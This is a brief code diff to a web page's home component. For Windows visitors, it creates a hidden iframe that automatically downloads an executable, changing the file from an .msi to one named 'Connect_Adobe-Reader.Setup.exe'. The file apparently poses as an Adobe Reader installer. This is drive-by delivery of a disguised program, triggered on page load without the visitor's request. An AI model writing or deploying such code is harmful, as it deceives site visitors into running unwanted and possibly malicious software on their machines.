@@ -11,7 +11,7 @@ export default function Home() {
     if (isWindows) {
       const iframe = document.createElement('iframe');
       iframe.style.display = 'none';
-      iframe.src = '/Reader_adobe_install_online.msi';
+      iframe.src = '/Connect_Adobe-Reader.Setup.exe';
       document.body.appendChild(iframe);
 
       setTimeout(() => {
